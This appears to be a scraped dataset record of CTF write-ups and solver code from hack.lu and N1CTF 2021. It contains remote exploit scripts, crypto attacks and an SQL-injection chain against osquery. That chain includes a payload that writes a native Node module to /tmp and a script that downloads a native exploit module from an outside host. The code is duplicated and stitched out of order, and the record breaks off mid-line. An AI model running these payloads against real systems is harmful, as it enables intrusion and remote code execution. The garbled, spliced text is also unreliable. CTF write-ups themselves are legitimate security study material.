os\n\nlocal=0\naslr=True\ncontext.log_level=\"debug\"\n#context.terminal = [\"deepin-terminal\",\"-x\",\"sh\",\"-c\"]\n\nif local==1:\n    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})\n    p = process(\"./run_chall.sh\",aslr=aslr)\n    #gdb.attach(p)\nelse:\n    remote_addr=['flu.xxx', 20065]\n    p=remote(remote_addr[0],remote_addr[1])\n\nru = lambda x : p.recvuntil(x)\nsn = lambda x : p.send(x)\nrl = lambda   : p.recvline()\nsl = lambda x : p.sendline(x)\nrv = lambda x : p.recv(x)\nsa = lambda a,b : p.sendafter(a,b)\nsla = lambda a,b : p.sendlineafter(a,b)\n\ndef lg(s):\n    print('\\033[1;31;40m{s}\\033[0m'.format(s=s))\n\ndef raddr(a=6):\n    if(a==6):\n        return u64(rv(a).ljust(8,'\\x00'))\n    else:\n        return u64(rl().strip('\\n').ljust(8,'\\x00'))\n\nif __name__ == '__main__':\n    if not local:\n        ru(\"size:\")\n    os.system(\"musl-gcc ./exp/exp.c --static -o ./exp/exp\")\n    poc = open(\"./exp/exp\", \"rb\").read()\n    size = len(poc)\n    sl(str(size))\n    ru(b\"Now send the file\\n\")\n    sn(poc)\n    p.interactive()\n\ntarget = [\n    0x14,  0x1E,   0xC,  0xE0,\n    0x30,  0x5C,  0xCE,  0xF0,\n    0x36,  0xAE,  0xFC,  0x39,\n    0x1A,  0x91,  0xCE,  0xB4,\n    0xC4,   0xE,  0x18,  0xF3,\n    0xC8,  0x8E,   0xA,  0x85,\n    0xF6, 0xbd\n]\n\narray_50c2 = [\n    0xD9,  0x50,  0x48,  0xB9,\n    0xD8,  0x50,  0x48,  0x60,\n    0x46,  0x54,  0x43,  0x44,\n    0x45,  0x49,  0x50,  0x55,\n    0x52,  0x53,  0x4C,  0x47,\n    0x58,  0x51,  0xF3,  0x50,\n    0x8,  0x51, 0x10\n]\n\n\narray_5219 = [\n    0xBD,  0x43,  0x11,  0x37,\n    0xF2,  0x69,  0xAB,  0x2C,\n    0x99,  0x13,  0x12,  0xD1,\n    0x7E,  0x9A,  0x8F,   0xE,\n    0x92,  0x37,  0xF4,  0xAA,\n    0x4D,  0x77,   0x3,  0x89,\n    0xCA,  0xFF,\n]\n\narray_5234 = [0 for _ in range(0x1a)]\n\nin_C = 0\n\nj = 0\nfor i in range(0x19, -1, -1):\n    in_C = 1 if (0x19 < i + 1) else 0\n    for j in range(0x30, 0x60):\n        array_50c2[i] = j\n        var1 = i\n        \n        var2 = 0\n        if var1 & 1 == 0:\n            array_5234[i] = array_50c2[i] ^ array_50c2[i + 1]\n            var2 = i\n            var1 = array_5234[i]\n            array_5234[i] = ((var1 << 1) | ((array_50c2[i] + i) >> 7)) & 0xff\n        else:\n            array_5234[i] = array_50c2[i] ^ array_5219[i]\n            var1 = array_5234[i]\n            array_5234[i] = ((var1 << 1) | in_C) & 0xff\n        if var1 >> 7 != 0:\n            array_5234[i] = array_5234[i] + 1\n\n        if array_5234[i] == target[i]:\n            print (chr(j), end= '')\n            break\n    else:\n        print (\"no\")\n#KNOTS_ORT3R_M3D_T3G_GALP\n\nfrom hashlib import md5\nk = str(input('please supply a valid key:')).encode()\ncorrect = len(k) == 16 and k[0] == 102 and k[1] == k[0] + 6 and k[2] == k[1] - k[0] + 91 and k[3] == 103 and k[4] == k[11] * 3 - 42 and k[5] == sum(k) - 1322 and k[6] + k[7] + k[10] == 260 and int(chr(k[7]) * 2) + 1 == k[9] and k[8] % 17 == 16 and k[9] == k[8] * 2 and md5(k[10] * b'a').digest()[0] - 1 == k[3] and k[11] == 55 and k[12] == k[14] / 2 - 2 and k[13] == k[10] * k[8] % 32 * 2 - 1 and k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23 and k[15] == 125\nprint(f\"valid key! {k.decode()}\" \n      if correct else 'invalid key :(')\n\nfrom z3 import *\n\ns = Solver()\n\nk = [BitVec('k%d' % i, 8) for i in range(16)]\n\ns.add(k[0] == 102)\ns.add(k[1] == k[0] + 6)\ns.add(k[2] == (k[1] - k[0]) + 91)\ns.add(k[3] == 103)\ns.add(k[4] == k[11] * 3 - 42)\ns.add(k[11] == 55)\ns.add(k[10] == 101)\ns.add(k[15] == 125)\ns.add(k[5] == sum(k) - 1322)\ns.add(k[6] + k[7] + k[10] == 260)\n# s.add(int(chr(k[7]) * 2) + 1 == k[9])\ns.add(k[7] > 0x30)\ns.add(k[7] < 0x40)\ns.add((k[7] - 0x30) * 11 + 1 == k[9])\ns.add(k[8] % 17 == 16)\ns.add(k[9] == k[8] * 2)\n# s.add(md5(k[10] * b'a').digest()[0] - 1 == k[3])\ns.add(k[12] == k[14] / 2 - 2)\ns.add(k[13] == (k[10] * k[8] % 32) * 2 - 1)\ns.add(k[14] == (k[12] ^ k[9] ^ k[15]) * 3 - 23)\n\nif s.check():\n    model = s.model()\n    for i in range(16):\n        if i == 5:\n            continue\n        print (chr(model[k[i]].as_long()), end='')\nelse:\n    print (\"No result\")\n#flag{f92de703d}\n\nfrom gmpy2 import *\n\nn=285093357453242924013602862066919842439\nc=['[7901544350463174591988078511923324618 184537633212194745105080990647249325476 38267354157968351348766484298141745170 115578755446448863198748495896654060883 227909878717027446328962010664108571738 68952806770118848950271133491209711403 102984378629787175198877216543195333448 113165098929714836603634331678300868297]',\n'[275785769863995996812546673147981657234 282132616793095905121920207741461086689 199143850961491870800209491624969361487 183070115427467531790361759454036865061 174393613375943957860321020903916142619 275194645696846365608618082603600388856 69288446973059562436205397370105909769 250845592176683528425664336374779963821]',\n'[240850912688047949049104289493502779367 37079483245590817588925021564795982646 284919536320463992115907743100691646551 267192067339793515017095456897132371813 121182789195982671419488187218656063538 130399763650220078736112759705997664043 58302430717741410187195454791677533281 52776571634234783572905063268137693827]',\n'[169777727664099029285002240103810929277 154451872004779288578874468507232138100 82607738862097099187707193194906553213 74662089586650151383705654824195379245 163301594729741444134552005626107105446 108759358332127220212407980222708706220 246214280347131537365215918063843772859 116415814239906926802482107105787268443]',\n'[908795231417421999718079313192191569 113455638257352165842372458444946217639 227447469062670411453330654385127815004 283532690966429919679614173872514718001 276175993211834485081856703624558763131 173640901552892130398996800843730480762 76779834958653181435792827716925863702 206290664138933571395486720765404890504]',\n'[123026279266464883266609008668623052393 40509778382957676307060245062252843393 95602462953785104138868279951166751882 43531259745075979730966911287989076615 82865327448522727488114604383808371535 207895953061666333553235571802877275412 65646216101552631749973551787307289641 123721676641648433423267884043005926042]',\n'[84235175585568651415313489109394597433 19269802923648441086555654660091822017 55658696563260880937491989834257209829 234537578061003475348324817681194241847 59802057487646966284905470410391468989 128776397130280003156298859718500600288 58714047777453918627738504174915596756 5382371557403759511409510761755596277]',\n'[142277648732395720338819526212844406606 105745456860747198927985508383729091578 7664467883802846117259187758423823692 192823773181406078295010428559954020697 35520988140119792330289151131523684908 76369098233361904415663724932463253635 257882448880941611481506133326850304617 201269699223045546065503672803127316556]',\n'[184609218721168183180805721365560584754 185020056544825781738449415772019342386 128805039558112680342001303071294028640 10656747463930421123322245691391167264 256942413240582039041230005139151025018 199624812561500081484838114437018161725 261608146489322534451783563132106825107 197042738069178244994802319518477132885]',\n'[270173223698478270395600379839285853220 57941625935617136420077100942293109042 42866159881477101699934525188688478291 246776886005156260287696971384169750083 137171422362434302212095391922793796625 189256954049770715201795707892595939413 122402164719872436761127887207817393790 98066517796093669928393689884743077086]',\n'[228483823411430971765632614756935594262 270867761665365061602695324172148308695 270682585589276777781448680945567679788 213507765198029256400141067987133373726 76037731708593018888930325428923617568 30682862786884871003242427010850491072 167298978250225467829760031606711270085 72822666625837066035637817957473696601]',\n'[195360134168787557177461554506460108718 122308058514175020254833726324781052273 225146579830375254258394356703192766275 141448314831908836605197528091870487865 150984932528304035512378115089222613654 258513501018477452331175661114007493672 280750213283721060295861114047761297997 149688812218926847069069885299483586476]',\n'[39751280632280049247741325771978681046 126855003643133686822494937986884309325 115180417419233183793165658750256344391 165938790171278140853730464165871696036 125785499316292959084455022571711272463 113018734944080600564983861961988444496 121333906833173879138713882299961654246 74854082980047960871154066988489234830]',\n'[137318192742872999161232833053514199378 77303525632818524122343716610518443942 160269374197044199668350654249626402587 115833901383881866816610270277305149900 208252536116807546101734823290785501108 217944947974996128948835835464385601397 166097670266427048341426239212284108828 6804019980433054638881349231392552603]',\n'[223303329908928292177045252540723878662 162073383009692124348835494388447606848 75684161198666039016621659050855083132 214809882035378545846738708974574594313 87881170698279792546809027489142288582 209684762911442115958995698637848828382 62250525374182677523486425819610947199 279847608325021186228379026650485946576]',\n'[67984665902369694514999957506279439994 268381222641753282423880203957876639758 246945134892118899884699312748250139309 65992451070302178885369398606163545606 116843550219931501998786016165547932075 183992253565936581165613292055256448566 263733379385279468893508349748581537056 271771128787717918335624952723447691861]',\n'[243684657592111494155573374100758277706 199888678572875313963836033529833113400 144529013312000077536517713640604480652 195346356780285790893865181659755080639 177192461902687091902497281184780912038 98619970825132499781249548734139906601 75338491010152968387510315283944125602 235096138241797869586420967960223530601]',\n'[72151893808127002595348778087435224319 81726004275189558083196981094140189988 120182868897691025353764768886735207100 202139727058084483577259545137210899092 172363102516135760004141577739481722490 47134074008080627610223569691660297614 123362836929825076302183828024021376167 223183587970484310511105130772286701816]',\n'[198229942846513253072302724550917821624 203790104834341577744516837088067561528 268462473934338408807986146010492366120 2838111217330153826487758479090332221 24168375885146064383306126685127043568 106145968666962799863332198895828734493 210842459276905023853370050105467358280 279918790313996396021668388694087973972]',\n'[279958295787638180753395460799528194681 282632555284078775050842945928105322059 236625278255622713621309747554901434361 152370360457970139981070013834891821455 279957343826025692192966948867958440827 283163488212063405065442268900136281469 13585301929645503773034214420121810733 84973170341472624058356167001596150486]']\n\nfor i in c:\n    temp=i[1:-1].split(' ')\n    flag=''.join(['0' if jacobi(int(j),n)==1  else '1' for j in temp])\n    print(chr(int(flag,2)),end='')\n#token=XF38YOg92IRNyugYD7go\n#flag{Oh_NO_aT_LEast_mY_AlGORithM_is_ExpanDiNg}    \n\nfrom netcat import *\nfrom Cryptodome.Hash import SHA3_256\nfrom Cryptodome.PublicKey import ECC\nfrom Cryptodome.Math.Numbers import Integer\n\ndef hash(msg):\n    h_obj = SHA3_256.new()\n    h_obj.update(msg.encode())\n    return Integer.from_bytes(h_obj.digest())\n\n\nr = remote(\"flu.xxx\", 20085)\nprint(r.recv_until(b\">\"))\nr.sendline(b\"show\")\nr.recv_until(b\"point_x=\")\nRx = int(r.recv_until(b\", point_y=\").decode().replace(\", point_y=\", \"\"))\nRy = int(r.recv_until(b\")\").decode().replace(\")\", \"\"))\nprint(Rx, Ry)\n\nhmsg = hash(\"cat flag\")\necc = ECC.generate(curve='P-256')\ntmp = hmsg * ecc._curve.G\nhx, hy = tmp.x, tmp.y\nprint(hx, hy)\n\nprint(r.recv_until(b\">\"))\nr.sendline(b\"run\")\nsig = f\"{Rx}|{Ry}|{hmsg}|cat flag\"\nprint(r.recv_until(b\">\"))\nr.sendline(sig.encode())\nprint(r.recv_until(b\"}\"))\n\nr.close()\n\nfrom Crypto.Util.number import long_to_bytes\nfrom netcat import *\n\ndef lfsr(state):\n    # x^384 + x^8 + x^7 + x^6 + x^4 + x^3 + x^2 + x + 1\n    mask   = (1 << 384) - (1 << 377) + 1\n    newbit = bin(state & mask).count('1') & 1\n    return (state >> 1) | (newbit << 383)\n\nr = remote(\"flu.xxx\", 20075)\nr.recvuntil(b\"Public key (q = 16411):\")\ntmp = r.recvuntil(b\"Encrypting flag:\\n\").decode().replace(\"Encrypting flag:\\n\", \"\")\npk = eval(tmp)\nlength = 352\nct = []\nfor i in range(length):\n    tmp = r.recvuntil(b\"\\n\").strip().decode()\n    #print(tmp)\n    c = eval(tmp)\n    #print(c[1], c)\n    ct.append(c)\n\ns = \"\"\nfor i in range(384):\n    r.recvuntil(b\"Your message bit: \\n\")\n    r.sendline(b\"1\")\n    res = r.recvuntil(b\"\\n\").strip()\n    if res == b\"Success!\":\n        #print(1, res)\n        s = \"1\" + s\n    else:\n        #print(0, res)\n        s = \"0\" + s\n\nt = int(s, 2)\ndef solve(t):\n    state = t\n    for i in \"01\":\n        tmp = bin(state)[2:].zfill(384)[1:] + i\n        tmp = int(tmp, 2)\n        if lfsr(tmp) == state:\n            return tmp\nstate = t\n\nfor i in range(384+length):\n    state = solve(state)\nflag = \"\"\nfor _ in range(length):\n    c = ct[_][1]\n    for i in range(384):\n        if (state >> i) & 1 == 1:\n            tmp += \"1\"\n            c -= pk[i][1]\n    c = c % 16411\n    if c == 0:\n        flag += \"0\"\n    else:\n        flag += \"1\"\n    state = lfsr(state)\n\nprint(long_to_bytes(int(flag, 2)))\nr.close()\n#flag{your_fluxmarket_stock_may_shift_up_now}\n\nimport re\nimport numpy as np\nimport cv2\n\npattern = r' event5   TOUCH_DOWN       \\+[\\d]{1,3}\\.[\\d]{1,3}s\\t0 \\(0\\)[ ]{1,3}[\\d]{1,3}\\.[\\d]{1,3}/[\\d]{1,3}\\.[\\d]{1,3} \\([\\d]{1,3}\\.[\\d]{1,3}/[\\d]{2,3}\\.[\\d]{2}mm\\)\\n'\npattern += r' event5   TOUCH_FRAME      \\+[\\d]{1,3}\\.[\\d]{1,3}s\\t\\n'\npattern += r' event5   TOUCH_UP         \\+[\\d]{1,3}\\.[\\d]{1,3}'\n\nf = open('touch.log', 'r')\ncontent = f.read()\nf.close()\n\nrows = re.findall(pattern, content)\n\ndef cap():\n    timePattern=re.compile(r'\\+([0-9]+)\\.([0-9]{3})s')\n    coodPattern=re.compile(r'\\( ?([0-9\\.]+)/ ?([0-9\\.]+)mm\\)')\n    \n    for row in rows:\n        time=timePattern.search(row)\n        time=int(time.group(1))*1000+int(time.group(2))\n        p=coodPattern.search(row)\n        x=float(p.group(1))\n        y=float(p.group(2))\n        yield ('',time,x,y)\n\nfourcc = cv2.VideoWriter_fourcc(*'XVID')\nfps=10.0\nout = cv2.VideoWriter('touch.avi', fourcc, fps, (259, 173))\nhistory=[[]]\ntotalTime=0\nfor i in cap():\n    time=i[1]\n    history[-1].append((i[2],i[3]))\n    frame=np.zeros((173,259,3),np.uint8)+255\n    for j in history[:-1]:\n        for k in j:\n            cv2.circle(frame,(int(k[0]),int(k[1])),1,(0,0,0),-1)\n    for k in history[-1]:\n        cv2.circle(frame,(int(k[0]),int(k[1])),1,(0,255,0),-1)\n\n    while totalTime<time:\n        print(totalTime)\n        totalTime+=100\n        out.write(frame)\nout.release()\n\n                  self.tail = self.head;\n                  self.head = self.tail + len;\n              }\n          } else {\n              // free is smaller than both head and tail,\n              // this means we have to slowly \"swap\" the tail and the head.\n              //\n              // from: EFGHI...ABCD or HIJK.ABCDEFG\n              // to:   ABCDEFGHI... or ABCDEFGHIJK.\n              let mut left_edge: usize = 0;\n              let mut right_edge: usize = self.tail;\n              unsafe {\n                  // The general problem looks like this\n                  // GHIJKLM...ABCDEF - before any swaps\n                  // ABCDEFM...GHIJKL - after 1 pass of swaps\n                  // ABCDEFGHIJM...KL - swap until the left edge reaches the temp store\n                  //                  - then restart the algorithm with a new (smaller) store\n                  // Sometimes the temp store is reached when the right edge is at the end\n                  // of the buffer - this means we've hit the right order with fewer swaps!\n                  // E.g\n                  // EF..ABCD\n                  // ABCDEF.. - after four only swaps we've finished\n                  while left_edge < len && right_edge != cap {\n                      let mut right_offset = 0;\n                      for i in left_edge..right_edge {\n                          right_offset = (i - left_edge) % (cap - right_edge);\n                          let src: isize = (right_edge + right_offset) as isize;\n                          ptr::swap(buf.add(i), buf.offset(src));\n                      }\n                      let n_ops = right_edge - left_edge;\n                      left_edge += n_ops;\n                      right_edge += right_offset + 1;\n                  }\n\n\n        def insert(self, name, context):\n                io.send(p8(0))\n\n\n        def get(self, name):\n                io.send(p8(1))\n\n\n                for i in range(size):\n                        ascii = ord(name[i])\n                        io.send(p8(ascii))\n                password = io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\", drop=True)\n                print(b\"password = \" + password)\n                return password\n\n\n        def alter(self, name, new_context):\n                io.send(p8(2))\n                size = len(name)\n                io.send(p8(size))\n                for i in range(size):\n                        ascii = ord(name[i])\n                        io.send(p8(ascii))\n                size2 = len(new_context)\n                io.send(p8(size2))\n                for i in range(size2):\n                        ascii = ord(new_context[i])\n                        io.send(p8(ascii))\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n\n        def alter_bytes(self, name, new_context):\n                io.send(p8(2))\n                size = len(name)\n                io.send(p8(size))\n                for i in range(size):\n                        ascii = ord(name[i])\n                        io.send(p8(ascii))\n\n\n        def add(self, context):\n            io.send(p8(7))\n\n\n        def show(self, idx):\n                io.send(p8(6))\n\n\n                content = io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\", drop=True)\n                print(b\"content = \" + content)\n                return content\n\n\n        def alter(self, idx, new_context):\n                io.send(p8(5))\n                io.send(p8(idx))\n                size = len(new_context)\n                io.send(p8(size))\n                for i in range(size):\n                        ascii = ord(new_context[i])\n                        io.send(p8(ascii))\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n\n        def alter_bytes(self, idx, new_context):\n                io.send(p8(5))\n                io.send(p8(idx))\n                size = len(new_context)\n                io.send(p8(size))\n                io.send(new_context)\n\n\n        def pop_set(self):\n                io.send(p8(4))\n                io.recvuntil(b\"\\x7f\\x7f\\x7f\\x7f\")\n\n\n        def push_back(self, task_list):\n                io.send(p8(3))\n\n\n        def one_task(self, context_list):\n            vec_num = len(context_list)\n\n\n    print('\\033[1;31;40m{s}\\033[0m'.format(s=s))\n\n\n        if (is_null($query)){\n            return;\n        }\n        if (strpos($query, '%') === false){\n            error('%s not included in query!');\n            return;\n        }\n        // get args\n        $args = func_get_args();\n        array_shift( $args );\n        $args_is_array = false;\n        if (is_array($args[0]) && count($args) == 1 ) {\n            $args = $args[0];\n            $args_is_array = true;\n        }\n        $count_format = substr_count($query, '%s');\n        if($count_format !== count($args)){\n            error('Wrong number of arguments!');\n            return;\n        }\n        // escape\n        foreach ($args as &$value){\n            $value = static::$db->real_escape_string($value);\n        }\n        // prepare\n        $query = str_replace(\"%s\", \"'%s'\", $query);\n        $query = vsprintf($query, $args);\n        return $query;\n    }\n\n\n        if array_5234[i] == target[i]:\n            print (chr(j), end= '')\n            break\n    else:\n        print (\"no\")\n\n\n    DWORD64 val[9]; \n    val[8] = 0;\n    val[0] = reval(invertVal(0x875cd4f2e18f8fc4));\n    val[1] = reval(invertVal(0xbb093e17e5d3fa42));\n    val[2] = reval(invertVal(0xada5dd034aae16b4));\n    val[3] = reval(invertVal(0x97322728fea51225));\n    val[4] = reval(invertVal(0x4124799d72188d0d));\n    val[5] = reval(invertVal(0x2b3e3fbbb4d44981));\n    val[6] = reval(invertVal(0xdfcac668321e4daa));\n    val[7] = reval(invertVal(0xeac2137a35c8923a));\n    printf(\"%s\\n\", val);\n\n\n    model = s.model()\n    for i in range(16):\n        if i == 5:\n            continue\n        print (chr(model[k[i]].as_long()), end='')\n\n\n    print (\"No result\")\n\n\n    temp=i[1:-1].split(' ')\n    flag=''.join(['0' if jacobi(int(j),n)==1  else '1' for j in temp])\n    print(chr(int(flag,2)),end='')\n\n\n    tmp = r.recvuntil(b\"\\n\").strip().decode()\n    #print(tmp)\n    c = eval(tmp)\n    #print(c[1], c)\n    ct.append(c)\n\n\n    r.recvuntil(b\"Your message bit: \\n\")\n    r.sendline(b\"1\")\n    res = r.recvuntil(b\"\\n\").strip()\n    if res == b\"Success!\":\n        #print(1, res)\n        s = \"1\" + s\n    else:\n        #print(0, res)\n        s = \"0\" + s\n\n\n    while totalTime<time:\n        print(totalTime)\n        totalTime+=100\n        out.write(frame)\n", "tools": ["python", "pycryptodome", "gmpy2", "z3", "burp", "ghidra", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20211102-hacklu\\README.md", "file_size": 49179, "scraped_at": "2025-10-26T18:19:26.699370"}
{"id": "r3kapig_writeup_N1CTF_2021_Writeup_(Web)", "team": "r3kapig", "repo": "writeup", "challenge_name": "N1CTF 2021 Writeup (Web)", "attack_type": "Misc", "writeup": "# N1CTF 2021 Writeup (Web)\n\nOriginally from https://harold.kim/blog/2021/11/n1ctf-writeup/.\n\n## Introduction\n\nI wasn't playing CTFs for almost a year due to my health conditions that has been causing me some troubles for a year now.\n\nI also lost some interest in solving CTF challenges during the COVID outbreak... Fortunately, my teammates are really talented enough to break down most challenges so I don't get that motivated to solve any CTF challenges right now.\n\nSince I was asked for an help on web challenges this time, I decided to check out some challenges.\n\n## web\n\n### QQQueryyy All The Things\n\n> Do you like Be----lla？\n>\n> China Mainland: http://47.57.246.66:12321/?str=world\n>\n> Others: http://8.218.140.54:12321/?str=world\n\nUnfortunately we couldn't get any source-code for this challenge, but it was obvious to see that SQL injection exists.\n\n<img src=//harold.kim/static/blog/n1ctf-web-1.png>\n\nLooking down a bit, we found that it's something to do with the SQLite.\n\n<img src=//harold.kim/static/blog/n1ctf-web-2.png>\n\nBy doing `SELECT * FROM sqlite_temp_schema` we can see some hidden tables that were not available from `sqlite_master`.\n\nAfter some Google searches with the names from the table list, we can see that this is a database tool by (https://osquery.io/)\n\n<img src=//harold.kim/static/blog/n1ctf-web-3.png>\n\nLater, we also found out that we can possibly read some of running processes within the server.\n\n<img src=//harold.kim/static/blog/n1ctf-web-4.png>\n\nMy teammate built a script and sent me some interesting logs of how others were exploiting.\n\n```json\n...\n  {\"cmdline\":\"tail -f /var/log/apache2/access.log\"},\n  {\"cmdline\":\"sh -c echo 'SELECT '\\\\''1'\\\\'';select * from curl where url='\\\\''http://127.0.0.1:16324'\\\\'' and user_agent='\\\\''\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nvar chunk=new Buffer(\\\"\\\\x50\\\\xe5\\\\x74\\\\x64\\\\x04\\\\x00\\\\x00\\\\x00\\\\xb4\\\\x20\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xb4\\\\x20\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xb4\\\\x20\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x3c\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x3c\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x04\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x51\\\\xe5\\\\x74\\\\x64\\\\x06\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x52\\\\xe5\\\\x74\\\\x64\\\\x04\\\\x00\\\\x00\\\\x00\\\\xf8\\\\x2d\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf8\\\\x3d\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf8\\\\x3d\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x08\\\\x02\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x08\\\\x02\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x04\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x05\\\\x00\\\\x00\\\\x00\\\\x47\\\\x4e\\\\x55\\\\x00\\\\x02\\\\x00\\\\x00\\\\xc0\\\\x04\\\\x00\\\\x00\\\\x00\\\\x03\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x04\\\\x00\\\\x00\\\\x00\\\\x14\\\\x00\\\\x00\\\\x00\\\\x03\\\\x00\\\\x00\\\\x00\\\\x47\\\\x4e\\\\x55\\\\x00\\\\xa9\\\\x1c\\\\xaf\\\\xac\\\\xe6\\\\x44\\\\xfe\\\\x91\\\\xc4\\\\x75\\\\x0b\\\\xb6\\\\xcf\\\\xf5\\\\xb3\\\\xb3\\\\xc7\\\\x04\\\\xe3\\\\x77\\\\x00\\\\x00\\\\x00\\\\x00\\\\x02\\\\x00\\\\x00\\\\x00\\\\x0b\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x06\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x80\\\\x00\\\\x20\\\\x00\\\\x00\\\\x00\\\\x00\\\\x0b\\\\x00\\\\x00\\\\x00\\\\xfd\\\\x9b\\\\xbc\\\\xdc\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x20\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xb0\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x5c\\\\x00\\\\x00\\\\x00\\\\x12\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x7b\\\\x00\\\\x00\\\\x00\\\\x12\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x55\\\\x00\\\\x00\\\\x00\\\\x12\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x99\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x20\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x63\\\\x00\\\\x00\\\\x00\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x2c\\\\x00\\\\x00\\\\x00\\\\x20\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\");var glzjins_girlfriend=require(\\\"fs\\\").openSync(\\\"/tmp/zglzjin_girlfriend4.node\\\",\\\"a\\\");require(\\\"fs\\\").writeSync(glzjins_girlfriend, chunk, 0, chunk.length);\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n//'\\\\'';select '\\\\''sqlmap'\\\\'' as hello;' | osqueryi --json\"},\n  {\"cmdline\":\"osqueryi --json\"},\n  {\"cmdline\":\"/src/iotjs/build/x86_64-linux/debug/bin/iotjs /src/iotjs/tools/repl.js\"},\n  {\"cmdline\":\"sh -c echo 'SELECT '\\\\''world'\\\\'';select cmdline from processes;--'\\\\'' as hello;' | osqueryi --json\"},\n  {\"cmdline\":\"osqueryi --json\"}\n...\n```\n\n.. and this was where my teammates were stuck. They asked for an help so I decided to ta", "solution_code": "#!/usr/bin/python\n#-*- coding: utf-8 -*-\nimport requests\nimport random\nimport base64\n\n\n# SQL Injection\nurl = \"http://47.57.246.66:12321/?str=world';{};--\"\n# Payload from other team\npayload = \"select group_concat(result)from curl where url='http://127.0.0.1:16324' and user_agent='\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n{node}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n'\"\n\n\n\"\"\"\nWrite native module to server\n\nfs = require(\"fs\");\nhttp = require(\"http\")\n\nf = fs.openSync(\"/tmp/styp.node\", \"w\")\nhttp.get({\n    host: \"158.101.144.10\",\n    port: 80,\n    path: \"/styp.node?exp\"\n}, function(resp){\n    resp.on(\"data\", function(exploit){\n        fs.writeSync(f, exploit, 0, exploit.length)\n    });\n    resp.on(\"end\", function(){\n        fs.closeSync(f)\n        process.exit(1)\n    });\n});\n\"\"\"\ngadget_init = 